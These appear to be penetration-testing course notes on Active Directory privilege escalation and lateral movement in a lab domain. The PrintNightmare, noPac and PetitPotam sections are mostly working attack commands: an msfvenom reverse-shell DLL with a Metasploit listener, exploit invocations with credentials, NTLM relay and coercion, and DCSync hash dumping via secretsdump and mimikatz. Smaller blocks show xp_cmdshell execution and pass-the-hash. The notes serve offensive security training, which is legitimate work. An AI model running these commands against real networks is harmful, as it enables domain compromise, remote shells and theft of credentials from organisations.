# Privileged Access

**if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol**

But what if we don't yet have local admin rights on any hosts in the domain? There are several other ways we can move around a Windows domain:
- Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host
- PowerShell Remoting - also referred to as **PSRemoting** or **Windows Remote Management (WinRM)** access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
- **MSSQL Server** - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
- CanRDP
- CanPSRemote
- SQLAdmin

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp !!!**

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote !!!**

**!!! https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin !!!**


## Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines.

- **Enumerating the Remote Desktop Users Group**
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

- **Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

![image](https://github.com/user-attachments/assets/712f8b98-b426-4a8f-b066-4e30ee2d7f37)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

- **Checking Remote Access Rights using BloodHound**

![image](https://github.com/user-attachments/assets/38b66cc4-a663-43ed-a193-6cd903d9bebe)

We could also check the `Analysis` tab and run the pre-built queries` Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`.

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or **`mstsc.exe`** if attacking from a Windows host.

## WinRM

- **Enumerating the Remote Management Users Group**

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

- We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/user-attachments/assets/18da4436-a45c-4023-bfae-295174c63903)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

![image](https://github.com/user-attachments/assets/c1cd8123-422e-47f2-ad0f-d137636513bf)

- **Establishing WinRM Session from Windows**
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

- **Establishing WinRM Session from Linux**
```
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

## SQL Server Admin

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

- **Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/user-attachments/assets/ef9f5c01-26b4-409f-b81c-94686831751e)

- **Enumerating MSSQL Instances with PowerUpSQL**
```
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Reference: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

- We can also authenticate from our Linux attack host using `mssqlclient.py` from the Impacket toolkit.
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

- We could then choose `enable_xp_cmdshell` to enable the `xp_cmdshell` stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
```
enable_xp_cmdshell
```
- Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have `SeImpersonatePrivilege`, which can be leveraged in combination with a tool such as `JuicyPotato`, `PrintSpoofer`, or `RoguePotato` to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate` and `SeAssignPrimaryToken` of the Windows Privilege Escalation module.

```
xp_cmdshell whoami /priv
```

Reference: https://github.com/ohpe/juicy-potato

Reference: https://github.com/itm4n/PrintSpoofer

Reference: https://github.com/antonioCoco/RoguePotato

> ***Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.***


# Kerberos "Double Hop" Problem

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.

```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

**In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.**

Let's say we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01.

![image](https://github.com/user-attachments/assets/f3a5d2db-c5d9-417f-a9fe-2c1148f99fc3)

When we connect to DEV01 using a tool such as evil-winrm, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as PowerView and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.

A few workarounds for the double-hop issue are covered in this post. We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an evil-winrm session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)

Reference: https://posts.slayerlabs.com/double-hop/

## Workarounds

### Workaround #1: PSCredential Object

We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.

- After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.
```
import-module .\PowerView.ps1
get-domainuser -spn
```
- If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.
```
klist
```
- **So now, let's set up a PSCredential object and try again. First, we set up our authentication.**
```
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```
- **Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.**
```
get-domainuser -spn -credential $Cred | select samaccountname
```
- If we try again without specifying the -credential flag, we once again get an error message.
```
get-domainuser -spn | select samaccountname
```

If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.

### Workaround #2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the `Enter-PSSession` cmdlet? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).

- Let's start by first establishing a WinRM session on the remote host.
```
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

If we check for cached tickets using klist, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

We also cannot interact directly with the DC using PowerView

- **One trick we can use here is registering a new session configuration using the `Register-PSSessionConfiguration` cmdlet.**
```
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```
- **Once this is done, we need to restart the WinRM service by typing `Restart-Service` WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.**
- **After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.**
```
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

> Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .

> **We can also use other methods such as _CredSSP_, _port forwarding_, or _injecting into a process running in the context of a target user_ (sacrificial process) that we won't cover here.**

# Bleeding Edge Vulnerabilities

## ZeroLogon

Reference: https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/

## DCShadow

Reference: https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/

## PrintNightmare

> CVE-2021-34527, CVE-2021-1675

Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation.

```
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

We will then host this payload in an SMB share we create on our attack host using smbserver.py.
```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated `SYSTEM` shell.

Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.


## NoPac (SamAccountName Spoofing)

Reference: https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699

> CVE-2021-42278, CVE-2021-42287

intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command

- 42278 is a bypass vulnerability with the Security Account Manager (SAM).
- 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.

Reference: https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware

Reference: https://github.com/Ridter/noPac

Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed.

```
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to `10`. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to `0`. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.

```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

We will notice that a _semi-interactive shell_ session is established with the target using `smbexec.py`. Keep in mind with smbexec shells we will need to use _exact paths_ instead of navigating the directory structure using `cd`.

> We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a **DCSync** using `secretsdump.py`. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing `smbexec.py` does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a `.bat` file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

## PetitPotam (MS-EFSRPC)

> CVE-2021-36942

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the **Local Security Authority Remote Protocol (LSARPC)** by abusing Microsoft’s **Encrypting File System Remote Protocol (MS-EFSRPC)**. This technique allows an unauthenticated attacker to take over a Windows domain where **Active Directory Certificate Services (AD CS)** is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from **PKINITtools** to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

Reference: https://github.com/dirkjanm/PKINITtools

Reference: https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/

First off, we need to start ntlmrelayx.py in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as `certi` to attempt to locate it.

Reference: https://github.com/zer1t0/certi

```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

Reference: https://github.com/topotam/PetitPotam

In another window, we can run the tool `PetitPotam.py`. We run this tool with the command py`thon3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to `Mimikatz` and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool `Invoke-PetitPotam.ps1`.

Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw method.

Reference: https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1

```
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

```

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the `KRB5CCNAME` environment variable, so our attack host uses this file for Kerberos authentication attempts.

```
export KRB5CCNAME=dc01.ccache
```

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the `ccache` file. We can see this by typing `klist` (using the `klist` command requires installation of the `krb5-user` package on our attack host. This is installed on ATTACK01 in the lab already).

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from `PKINITtools` we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

Reference: https://stealthbits.com/blog/what-is-the-kerberos-pac/

```
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

> Note: We would need to use the MS01 attack host in another section, such as the ACL Abuse Tactics or Privileged Access section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

```
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

We can then type klist to confirm that the ticket is in memory.

```
klist
```

Again, since Domain Controllers have replication privileges in the domain, we can use the **pass-the-ticket** to perform a **DCSync** attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the `KRBTGT` account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.

```
cd .\mimikatz\x64\
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```

#### PetitPotam Mitigations

First off, the patch for CVE-2021-36942 should be applied to any affected hosts. Below are some further hardening steps that can be taken:
- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper Certified Pre-Owned as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.

Reference: https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf

# Miscellaneous Misconfigurations

## Exchange Related Group Membership

A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group **Exchange Windows Permissions** is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

Reference: https://github.com/gdedrouas/Exchange-AD-Privesc

The Exchange group **Organization Management** is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called **Microsoft Exchange Security Groups**, which contains the group **Exchange Windows Permissions**.

Viewing Organization Management's Permissions:
![image](https://github.com/user-attachments/assets/7c3ea462-9594-4f9d-b2e6-89b811f41293)

If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.

## PrivExchange

The **PrivExchange** attack results from a flaw in the Exchange Server **PushSubscription** feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug

The Printer Bug is a flaw in the **MS-RPRN** protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the **RpcOpenPrinter** method and use the **RpcRemoteFindFirstPrinterChangeNotificationEx** method, and force the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can use tools such as the **`Get-SpoolStatus`** module from this tool (that can be found on the spawned target) or this tool to check for machines vulnerable to the **MS-PRN Printer Bug**. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

Reference: http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment

Reference: https://github.com/NotMedic/NetNTLMtoSilverTicket

Reference: https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability

- **Enumerating for MS-PRN Printer Bug**
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## MS14-068

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the Python Kerberos Exploitation Kit (PyKEK) or the Impacket toolkit. The only defense against this attack is patching. The machine Mantis on the Hack The Box platform showcases this vulnerability.

Reference: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek

Reference: https://app.hackthebox.com/machines/98

## Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this post.

## Enumerating DNS Records

We can use a tool such as **`adidnsdump`** to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post.

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.

Reference: https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/

- **Using `adidnsdump`**
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
- **Viewing the Contents of the records.csv File**
```
head records.csv
```
If we run again with the `-r` flag the tool will attempt to resolve unknown records by performing an A query. Now we can see that an IP address of 172.16.5.240 showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.

- **Using the -r Option to Resolve Unknown Records**
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

## Password in Description Field

Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using `PowerView`. For large domains, it is helpful to export this data to a CSV file to review offline.

- **Finding Passwords in the Description Field using Get-Domain User**
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

## PASSWD_NOTREQD Field

